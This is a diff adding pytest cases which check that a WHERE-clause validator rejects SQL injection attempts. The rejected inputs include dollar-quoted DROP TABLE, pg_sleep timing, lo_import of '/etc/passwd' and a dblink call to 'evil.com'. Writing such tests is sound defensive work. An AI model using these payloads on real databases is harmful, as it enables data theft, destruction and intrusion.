@@ -453,3 +453,62 @@ class TestEdgeCases:
         for case_variant in ["DROP", "drop", "Drop", "dRoP"]:
             with pytest.raises(IdentifierValidationError):
                 validate_identifier(case_variant, "test")
+
+
+class TestWhereClauseDelegation:
+    """Verify input_validators.validate_where_clause catches attacks via config delegation.
+
+    These vectors were previously only caught by config.validate_where_clause.
+    After the delegation fix, the input_validators wrapper must catch them too.
+    """
+
+    def test_dollar_quoting_blocked(self):
+        with pytest.raises(SeedValidationError, match="dangerous SQL patterns"):
+            validate_where_clause("$$DROP TABLE users$$")
+
+    def test_tagged_dollar_quoting_blocked(self):
+        with pytest.raises(SeedValidationError, match="dangerous SQL patterns"):
+            validate_where_clause("$body$DROP TABLE users$body$")
+
+    def test_type_cast_blocked(self):
+        with pytest.raises(SeedValidationError, match="dangerous SQL patterns"):
+            validate_where_clause("id = 1::int")
+
+    def test_escape_string_blocked(self):
+        with pytest.raises(SeedValidationError, match="dangerous SQL patterns"):
+            validate_where_clause("id = E'\\x44ROP'")
+
+    def test_pg_sleep_blocked(self):
+        with pytest.raises(SeedValidationError, match="dangerous SQL patterns"):
+            validate_where_clause("id = 1 AND pg_sleep(10)")
+
+    def test_lo_import_blocked(self):
+        with pytest.raises(SeedValidationError, match="dangerous SQL patterns"):
+            validate_where_clause("id = lo_import('/etc/passwd')")
+
+    def test_dblink_blocked(self):
+        with pytest.raises(SeedValidationError, match="dangerous SQL patterns"):
+            validate_where_clause("id = 1 AND dblink('host=evil.com')")
+
+    def test_fullwidth_unicode_drop_blocked(self):
+        with pytest.raises(SeedValidationError, match="dangerous SQL patterns"):
+            validate_where_clause("\uff24\uff32\uff2f\uff30 TABLE users")
+
+    def test_comment_sequences_blocked(self):
+        with pytest.raises(SeedValidationError, match="dangerous SQL patterns"):
+            validate_where_clause("id = 1 -- comment")
+        with pytest.raises(SeedValidationError, match="dangerous SQL patterns"):
+            validate_where_clause("id = 1 /* comment */")
+
+    def test_standalone_drop_keyword_blocked(self):
+        """DROP as a bare keyword (not just DROP TABLE) should be caught."""
+        with pytest.raises(SeedValidationError, match="dangerous SQL patterns"):
+            validate_where_clause("1=1 DROP TABLE users")
+
+    def test_safe_clauses_still_pass(self):
+        """Ensure delegation does not cause false positives on safe inputs."""
+        validate_where_clause("status = 'active'")
+        validate_where_clause("id IN (1, 2, 3)")
+        validate_where_clause("dropbox_id = 123")
+        validate_where_clause("category = 'DELETE'")
+        validate_where_clause("name = 'O''Brien'")
